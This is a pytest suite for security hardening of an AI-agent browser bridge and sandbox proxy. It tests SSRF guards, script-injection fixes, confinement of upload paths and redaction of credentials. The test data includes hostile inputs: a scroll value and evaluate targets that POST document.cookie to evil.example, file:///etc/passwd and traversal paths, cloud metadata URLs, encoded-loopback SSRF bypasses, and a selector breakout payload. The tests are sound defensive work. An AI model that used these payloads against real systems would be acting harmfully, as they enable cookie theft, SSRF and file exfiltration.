"""Input-validation hardening for agent-facing execution surfaces.

Covers four confirmed findings:
  - AWI scroll: client-supplied ``amount`` was interpolated into a JS
    expression executed via page.evaluate (script injection).
  - AWI navigate_to / create_session: any URL was accepted, including
    ``file://`` (host file read) and link-local/RFC1918 targets (SSRF).
  - AWI upload_file: any host file path could be uploaded to a remote page
    (arbitrary file exfiltration).
  - Behavioral sandbox HTTP proxy: the environment's ``network_access``
    flag was never enforced, and the URL was fetched unchecked (SSRF).

Plus the AWI DOM-bridge follow-ups: the URL guard fails closed when DNS
resolution fails, page-state extraction and action previews redact
credential values, caller text stays inside quoted selector literals, and
page.evaluate only runs fixed server-defined scripts.
"""

from __future__ import annotations

import json
import socket

import pytest

from app.core import url_guard
from app.core.config import get_settings
from app.core.url_guard import check_outbound_url
from app.services.awi_playwright_bridge import (
    AWIPlaywrightBridge,
    BridgeSession,
    CommandType,
    DOMElement,
    PlaywrightCommand,
)
from app.services.behavioral_sandbox import BehavioralSandboxEngine


@pytest.fixture
def bridge():
    return AWIPlaywrightBridge()


@pytest.fixture
def session():
    return BridgeSession(session_id="test-session", current_url="https://example.com")


@pytest.fixture
def public_documentation_dns(monkeypatch):
    """Keep public-host assertions independent of local DNS interception."""

    async def resolve(_host):
        return [(None, None, None, None, ("93.184.216.34", 0))]

    monkeypatch.setattr(url_guard, "_resolve_host", resolve)


class TestOutboundUrlGuard:
    @pytest.mark.anyio
    @pytest.mark.parametrize(
        "url,reason",
        [
            ("file:///etc/passwd", "scheme_not_allowed"),
            ("javascript:alert(1)", "scheme_not_allowed"),
            ("data:text/html,<script>1</script>", "scheme_not_allowed"),
            ("ftp://example.com/x", "scheme_not_allowed"),
            ("http://", "missing_host"),
            ("http://127.0.0.1:8000/admin", "private_address_blocked"),
            ("http://10.0.0.5/internal", "private_address_blocked"),
            ("http://192.168.1.1/", "private_address_blocked"),
            ("http://169.254.169.254/latest/meta-data/", "private_address_blocked"),
            ("http://[::1]:6379/", "private_address_blocked"),
            ("http://localhost:8080/", "private_host_blocked"),
            (
                "http://metadata.google.internal/computeMetadata/",
                "private_host_blocked",
            ),
            ("http://foo.internal/", "private_host_blocked"),
        ],
    )
    async def test_dangerous_targets_are_blocked(self, url, reason):
        assert await check_outbound_url(url) == reason

    @pytest.mark.anyio
    async def test_public_https_url_is_allowed(self, public_documentation_dns):
        assert await check_outbound_url("https://example.com/page") is None

    @pytest.mark.anyio
    @pytest.mark.parametrize(
        "url",
        [
            "http://2130706433/",  # decimal-encoded 127.0.0.1
            "http://0x7f000001/",  # hex-encoded 127.0.0.1
            "http://017700000001/",  # octal-encoded 127.0.0.1
            "http://0/",  # 0.0.0.0
            "http://evil.example.com@127.0.0.1/",  # userinfo confusion
            "http://[::ffff:169.254.169.254]/",  # ipv6-mapped metadata
        ],
    )
    async def test_ip_encoding_tricks_are_blocked(self, url):
        # These resolve to loopback/metadata despite not being dotted-quad
        # literals; the guard must still reject them.
        assert await check_outbound_url(url) == "private_address_blocked"

    @pytest.mark.anyio
    async def test_userinfo_does_not_mask_a_public_host(self, public_documentation_dns):
        # Here the real host is the public one; the loopback string is only
        # userinfo and must not trigger a false block.
        assert await check_outbound_url("http://127.0.0.1@example.com/") is None

    @pytest.mark.anyio
    @pytest.mark.parametrize(
        "error",
        [
            socket.gaierror(socket.EAI_NONAME, "Name or service not known"),
            UnicodeError("encoding with 'idna' codec failed (label too long)"),
        ],
    )
    async def test_unresolvable_hostname_fails_closed(self, monkeypatch, error):
        # The guard cannot vouch for a name it could not resolve: the browser
        # (or a later retry) may resolve it differently, e.g. to an intranet
        # address. Fail closed, as the upstream MCP URL guard already does.
        async def resolve(_host):
            raise error

        monkeypatch.setattr(url_guard, "_resolve_host", resolve)
        assert (
            await check_outbound_url("https://intranet-only.example/")
            == "dns_resolution_failed"
        )

    @pytest.mark.anyio
    async def test_unresolvable_navigation_target_is_blocked(
        self, monkeypatch, bridge, session
    ):
        async def resolve(_host):
            raise socket.gaierror(socket.EAI_NONAME, "Name or service not known")

        monkeypatch.setattr(url_guard, "_resolve_host", resolve)
        with pytest.raises(ValueError, match="dns_resolution_failed"):
            await bridge._handle_navigate_to(
                session, {"url": "https://intranet-only.example/"}
            )

    @pytest.mark.anyio
    async def test_private_target_escape_hatch_never_allows_file_scheme(
        self, monkeypatch
    ):
        monkeypatch.setattr(get_settings(), "ALLOW_PRIVATE_NETWORK_TARGETS", True)
        assert await check_outbound_url("http://127.0.0.1:8000/") is None
        assert await check_outbound_url("file:///etc/passwd") == "scheme_not_allowed"


class TestAWIScrollInjection:
    @pytest.mark.anyio
    async def test_non_numeric_scroll_amount_is_rejected(self, bridge, session):
        with pytest.raises(ValueError, match="integer"):
            await bridge._handle_scroll(
                session,
                {
                    "amount": "300); fetch('https://evil.example', "
                    "{method:'POST', body: document.cookie}); (0"
                },
            )

    @pytest.mark.anyio
    async def test_numeric_scroll_amount_still_works(self, bridge, session):
        commands = await bridge._handle_scroll(session, {"amount": "250"})
        assert commands[0].target == "window.scrollBy(0, 250)"

    @pytest.mark.anyio
    async def test_scroll_amount_is_clamped(self, bridge, session):
        commands = await bridge._handle_scroll(session, {"amount": 10**9})
        assert commands[0].target == "window.scrollBy(0, 20000)"


class TestAWINavigationGuard:
    @pytest.mark.anyio
    @pytest.mark.parametrize(
        "url",
        [
            "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:8080/",
        ],
    )
    async def test_navigate_to_blocks_dangerous_urls(self, bridge, session, url):
        with pytest.raises(ValueError, match="navigation blocked"):
            await bridge._handle_navigate_to(session, {"url": url})

    @pytest.mark.anyio
    async def test_navigate_to_allows_public_url(
        self, bridge, session, public_documentation_dns
    ):
        commands = await bridge._handle_navigate_to(
            session, {"url": "https://example.com/products"}
        )
        assert commands[0].target == "https://example.com/products"

    @pytest.mark.anyio
    async def test_create_session_blocks_file_scheme(self, bridge):
        with pytest.raises(ValueError, match="navigation blocked"):
            await bridge.create_session("file:///etc/passwd")


class TestAWIUploadConfinement:
    def test_uploads_disabled_without_configured_dir(self, monkeypatch):
        monkeypatch.setattr(get_settings(), "AWI_UPLOAD_DIR", "")
        with pytest.raises(ValueError, match="disabled"):
            AWIPlaywrightBridge._confine_upload_path("report.pdf")

    def test_absolute_host_path_outside_root_is_blocked(self, monkeypatch, tmp_path):
        monkeypatch.setattr(get_settings(), "AWI_UPLOAD_DIR", str(tmp_path))
        with pytest.raises(ValueError, match="escapes"):
            AWIPlaywrightBridge._confine_upload_path("/etc/passwd")

    def test_traversal_out_of_root_is_blocked(self, monkeypatch, tmp_path):
        monkeypatch.setattr(get_settings(), "AWI_UPLOAD_DIR", str(tmp_path))
        with pytest.raises(ValueError, match="escapes"):
            AWIPlaywrightBridge._confine_upload_path("../../etc/passwd")

    def test_staged_file_inside_root_is_allowed(self, monkeypatch, tmp_path):
        monkeypatch.setattr(get_settings(), "AWI_UPLOAD_DIR", str(tmp_path))
        resolved = AWIPlaywrightBridge._confine_upload_path("docs/report.pdf")
        assert resolved == str(tmp_path / "docs" / "report.pdf")


class _RecordingPage:
    """Fake Playwright page that records selector and evaluate traffic."""

    url = "https://example.com/login"

    def __init__(self, inputs=None):
        self.selectors: list[str] = []
        self.evaluations: list[tuple] = []
        self._inputs = inputs or []

    async def query_selector_all(self, selector):
        self.selectors.append(selector)
        return []

    async def evaluate(self, expression, arg=None):
        self.evaluations.append((expression, arg))
        if "document.querySelectorAll('input, textarea, select')" in expression:
            return [dict(item) for item in self._inputs]
        return []

    async def wait_for_selector(self, selector, timeout=None):
        return None

    async def title(self):
        return "Login"


def _top_level_chain_operators(selector: str) -> int:
    """Count Playwright ``>>`` engine-chain operators outside quoted strings.

    Mirrors Playwright's selector splitter: a backslash escapes the next
    character, and a double quote, single quote or backtick opens a quoted run.
    """
    count = 0
    quote = None
    index = 0
    while index < len(selector):
        char = selector[index]
        if char == "\\" and index + 1 < len(selector):
            index += 2
        elif char == quote:
            quote = None
            index += 1
        elif quote is None and char in "\"'`":
            quote = char
            index += 1
        elif quote is None and selector.startswith(">>", index):
            count += 1
            index += 2
        else:
            index += 1
    return count


@pytest.mark.proof
class TestAWIStateExtractionRedaction:
    """Page-state extraction must never hand credential values to callers."""

    SECRETS = ("hunter2", "csrf-secret-value", "918273", "pwd-in-text-field")

    INPUTS = [
        {"name": "pw", "id": "pw", "type": "password", "value": "hunter2"},
        {"name": "q", "id": "q", "type": "text", "value": "laptop"},
        {
            "name": "csrf_token",
            "id": "",
            "type": "hidden",
            "value": "csrf-secret-value",
        },
        {
            "name": "code",
            "id": "code",
            "type": "text",
            "autocomplete": "one-time-code",
            "value": "918273",
        },
        {"name": "user_pwd", "id": "", "type": "text", "value": "pwd-in-text-field"},
        {"name": "empty_pw", "id": "", "type": "password", "value": ""},
    ]

    @pytest.mark.anyio
    async def test_get_inputs_redacts_credential_values(self, bridge, session):
        session._page = _RecordingPage(self.INPUTS)

        inputs = await bridge._get_inputs(session)

        serialized = json.dumps(inputs)
        for secret in self.SECRETS:
            assert secret not in serialized
        by_name = {item["name"]: item for item in inputs}
        # Non-credential values still flow so agents can read form state.
        assert by_name["q"]["value"] == "laptop"
        # The field stays visible, and a filled one is marked as filled.
        assert by_name["pw"]["value"] == "[REDACTED]"
        assert by_name["empty_pw"]["value"] == ""

    @pytest.mark.anyio
    async def test_json_structure_state_never_contains_password(self, bridge, session):
        session._page = _RecordingPage(self.INPUTS)
        bridge._sessions[session.session_id] = session

        state = await bridge.extract_state_representation(
            session.session_id, representation_type="json_structure"
        )

        serialized = json.dumps(state)
        for secret in self.SECRETS:
            assert secret not in serialized
        assert "laptop" in serialized

    @pytest.fixture
    def login_page_elements(self, monkeypatch, bridge):
        selectors = {
            "email_input": ("#email", {"type": "email"}),
            "password_input": ("#password", {"type": "password"}),
            "login_button": ("#login", {"type": "submit"}),
        }

        async def find(_session, semantic_type):
            if semantic_type not in selectors:
                return None
            css, attributes = selectors[semantic_type]
            return DOMElement(
                tag="input",
                text_content="",
                attributes=attributes,
                xpath="",
                css_selector=css,
            )

        monkeypatch.setattr(bridge, "_find_semantic_element", find)

    @pytest.mark.anyio
    async def test_login_preview_does_not_echo_password(
        self, bridge, session, login_page_elements
    ):
        bridge._sessions[session.session_id] = session
        params = {"email": "agent@example.com", "password": "hunter2"}

        preview = await bridge.preview_action(session.session_id, "login", params)

        serialized = json.dumps(preview)
        assert "hunter2" not in serialized
        assert "agent@example.com" in serialized
        # Execution still receives the real secret: only the echo is redacted.
        commands = await bridge.translate_action(session.session_id, "login", params)
        assert any(
            c.command_type == CommandType.FILL and c.value == "hunter2"
            for c in commands
        )

    @pytest.mark.anyio
    async def test_fill_form_preview_does_not_echo_password(
        self, bridge, session, login_page_elements
    ):
        bridge._sessions[session.session_id] = session

        preview = await bridge.preview_action(
            session.session_id,
            "fill_form",
            {"data": {"password": "hunter2", "email": "agent@example.com"}},
        )

        serialized = json.dumps(preview)
        assert "hunter2" not in serialized
        assert "agent@example.com" in serialized

    @pytest.mark.anyio
    async def test_fill_field_preview_redacts_only_credential_targets(
        self, bridge, session
    ):
        bridge._sessions[session.session_id] = session

        secret = await bridge.preview_action(
            session.session_id,
            "fill_field",
            {"selector": "input[type=password]", "value": "hunter2"},
        )
        plain = await bridge.preview_action(
            session.session_id,
            "fill_field",
            {"selector": "#q", "value": "laptop"},
        )

        assert "hunter2" not in json.dumps(secret)
        assert plain["commands"][0]["value"] == "laptop"


@pytest.mark.proof
class TestAWISelectorLiteralEscaping:
    """Caller text must stay inside one quoted selector literal."""

    PAYLOAD = 'a" >> xpath=//input[@type="password"]'

    @pytest.mark.anyio
    @pytest.mark.parametrize(
        "finder",
        ["_find_element_by_text", "_find_element_by_label", "_find_element_by_name"],
    )
    async def test_quote_breakout_cannot_chain_selector_engines(
        self, bridge, session, finder
    ):
        page = _RecordingPage()
        session._page = page

        await getattr(bridge, finder)(session, self.PAYLOAD)

        assert page.selectors
        for selector in page.selectors:
            assert _top_level_chain_operators(selector) == 0, selector
            assert self.PAYLOAD not in selector, selector

    @pytest.mark.anyio
    @pytest.mark.parametrize("text", ["Sign in", "×"])
    async def test_plain_text_lookup_keeps_working(self, bridge, session, text):
        page = _RecordingPage()
        session._page = page

        await bridge._find_element_by_text(session, text)

        assert f'text="{text}"' in page.selectors
        assert f'button:has-text("{text}")' in page.selectors


@pytest.mark.proof
class TestAWIEvaluateSink:
    """page.evaluate must only ever run fixed, server-defined scripts."""

    @pytest.mark.anyio
    @pytest.mark.parametrize(
        "target",
        [
            "fetch('https://evil.example', {method: 'POST', body: document.cookie})",
            "window.scrollBy(0, 1); fetch('https://evil.example')",
            "window.scrollBy(0, 99999999)",
        ],
    )
    async def test_arbitrary_evaluate_command_is_refused(self, bridge, session, target):
        page = _RecordingPage()
        session._page = page

        with pytest.raises(ValueError, match="not permitted"):
            await bridge._execute_single_command(
                session,
                PlaywrightCommand(command_type=CommandType.EVALUATE, target=target),
            )
        assert page.evaluations == []

    @pytest.mark.anyio
    async def test_execute_commands_reports_refused_evaluate(self, bridge, session):
        page = _RecordingPage()
        session._page = page
        bridge._sessions[session.session_id] = session

        result = await bridge.execute_commands(
            session.session_id,
            [
                PlaywrightCommand(
                    command_type=CommandType.EVALUATE,
                    target="document.cookie",
                )
            ],
        )

        assert result.success is False
        assert result.commands_executed == 0
        assert "not permitted" in (result.error or "")
        assert page.evaluations == []

    @pytest.mark.anyio
    @pytest.mark.parametrize(
        "direction,amount,expected",
        [
            ("up", 300, "window.scrollBy(0, -300)"),
            ("up", -5, "window.scrollBy(0, 5)"),
            ("left", 300, "window.scrollBy(-300, 0)"),
            ("left", -40, "window.scrollBy(40, 0)"),
            ("right", 120, "window.scrollBy(120, 0)"),
            ("down", -20, "window.scrollBy(0, -20)"),
        ],
    )
    async def test_scroll_sign_is_computed_not_concatenated(
        self, bridge, session, direction, amount, expected
    ):
        commands = await bridge._handle_scroll(
            session, {"direction": direction, "amount": amount}
        )
        assert commands[0].target == expected

    @pytest.mark.anyio
    async def test_scroll_runs_fixed_script_with_numeric_arguments(
        self, bridge, session
    ):
        page = _RecordingPage()
        session._page = page

        for amount in (250, 900):
            [command] = await bridge._handle_scroll(
                session, {"direction": "up", "amount": amount}
            )
            command.wait_for_timeout_ms = 0
            await bridge._execute_single_command(session, command)

        scripts = {expression for expression, _ in page.evaluations}
        assert len(scripts) == 1, scripts
        assert [arg for _, arg in page.evaluations] == [[0, -250], [0, -900]]

    @pytest.mark.anyio
    @pytest.mark.parametrize("value", ["1);alert(1", True, 1.5, None])
    async def test_scroll_command_requires_integer_value(self, bridge, session, value):
        page = _RecordingPage()
        session._page = page

        with pytest.raises(ValueError, match="integer"):
            await bridge._execute_single_command(
                session,
                PlaywrightCommand(
                    command_type=CommandType.SCROLL, target="", value=value
                ),
            )
        assert page.evaluations == []

    @pytest.mark.anyio
    async def test_scroll_command_with_integer_value_runs(self, bridge, session):
        page = _RecordingPage()
        session._page = page

        await bridge._execute_single_command(
            session,
            PlaywrightCommand(command_type=CommandType.SCROLL, target="", value=400),
        )

        assert [arg for _, arg in page.evaluations] == [[0, 400]]


class TestSandboxHttpProxyGuard:
    @pytest.fixture
    def engine(self):
        return BehavioralSandboxEngine(redis_url="redis://localhost:6379")

    @pytest.mark.anyio
    async def test_network_access_flag_is_enforced(self, engine):
        result = await engine._execute_http_proxy(
            "http_get",
            {"url": "https://example.com/"},
            False,
            5,
            network_access=False,
        )
        assert result["success"] is False
        assert "network_access is disabled" in result["error"]

    @pytest.mark.anyio
    async def test_ssrf_target_blocked_even_with_network_access(self, engine):
        result = await engine._execute_http_proxy(
            "http_get",
            {"url": "http://169.254.169.254/latest/meta-data/"},
            False,
            5,
            network_access=True,
        )
        assert result["success"] is False
        assert "request blocked" in result["error"]

    @pytest.mark.anyio
    async def test_dry_run_never_touches_the_network(self, engine):
        result = await engine._execute_http_proxy(
            "http_get",
            {"url": "http://169.254.169.254/latest/meta-data/"},
            True,
            5,
            network_access=False,
        )
        assert result["success"] is True
        assert result["output"]["dry_run"] is True
